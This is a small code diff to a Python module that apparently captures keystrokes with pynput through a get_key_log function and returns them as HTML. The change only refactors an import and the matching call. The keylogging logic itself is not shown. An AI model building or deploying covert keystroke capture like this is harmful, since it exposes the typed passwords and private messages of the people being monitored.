@@ -2,7 +2,7 @@ import datetime
 from pynput import keyboard
 import time
 
-from htmlgenerator import html_msg
+import htmlgenerator as ht
 
 spec_key = {
     key: f'⌠{key}⌡'
@@ -61,7 +61,7 @@ def get_key_log(duration=5):
     content = __key_log(duration)
 
     response = {
-        'html': html_msg(content, status=None, bold_all=False),
+        'html': ht.html_msg(content, status=None, bold_all=False),
         'data': None
     }
 
